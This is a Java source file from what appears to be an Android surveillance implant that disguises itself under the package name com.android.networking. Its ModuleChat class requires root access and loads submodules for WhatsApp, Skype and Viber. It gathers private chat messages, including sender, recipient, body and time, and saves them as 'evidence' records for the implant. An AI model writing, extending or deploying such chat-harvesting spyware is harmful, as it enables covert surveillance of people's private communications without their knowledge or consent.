package com.android.networking.module;

import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.FactoryConfigurationError;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;
import org.xmlpull.v1.XmlPullParser;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.os.Message;
import android.util.Pair;
import android.util.Xml;

import com.android.networking.Messages;
import com.android.networking.ProcessInfo;
import com.android.networking.ProcessStatus;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.capabilities.XmlParser;
import com.android.networking.conf.ConfModule;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.evidence.EvDispatcher;

import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.Markup;
import com.android.networking.file.AutoFile;
import com.android.networking.interfaces.Observer;
import com.android.networking.listener.ListenerProcess;
import com.android.networking.module.chat.ChatViber;
import com.android.networking.module.chat.MessageChat;
import com.android.networking.module.chat.ChatSkype;
import com.android.networking.module.chat.ChatWhatsapp;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.DateTime;
import com.android.networking.util.StringUtils;
import com.android.networking.util.WChar;

public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {

	private static final String TAG = "ModuleChat";

	SubModuleManager subModuleManager;

	public ModuleChat() {
		subModuleManager = new SubModuleManager(this);

		subModuleManager.add(new ChatWhatsapp());
		subModuleManager.add(new ChatSkype());

		subModuleManager.add(new ChatViber());

	}

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {

			setDelay(SOON);
			setPeriod(NEVER);
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse), don't have root, bailing out");
			}
			return false;
		}
	}

	@Override
	protected void actualGo() {
		// check for whatsapp activities
		// open db msgstore /data/data/com.whatsapp/databases/msgstore.db
		// open table chat_list
		// per ogni entry leggere l'ultimo messaggio letto.
		// open table messages
		subModuleManager.go();
	}

	@Override
	protected void actualStart() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}

		ListenerProcess.self().attach(this);
		subModuleManager.start();
	}

	@Override
	protected void actualStop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStop)");
		}
		subModuleManager.stop();
		ListenerProcess.self().detach(this);
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence)");
		}

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		for (MessageChat message : messages) {
			DateTime datetime = new DateTime(message.timestamp);

			// TIMESTAMP
			items.add(datetime.getStructTm());
			// PROGRAM_TYPE
			items.add(ByteArray.intToByteArray(message.programId));
			// FLAGS
			int incoming = message.incoming ? 0x01 : 0x00;
			items.add(ByteArray.intToByteArray(incoming));
			// FROM
			items.add(WChar.getBytes(message.from, true));
			// FROM DISPLAY
			items.add(WChar.getBytes(message.from, true));
			// TO
			items.add(WChar.getBytes(message.to, true));
			// TO DISPLAY
			items.add(WChar.getBytes(message.to, true));
			// CONTENT
			items.add(WChar.getBytes(message.body, true));
			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + message.from + " -> " + message.to
						+ " : " + message.body);
			}
		}

		EvidenceReference.atomic(EvidenceType.CHATNEW, items);
	}

	@Override
	public int notification(ProcessInfo process) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification), ");
		}
		return subModuleManager.notification(process);
	}

}
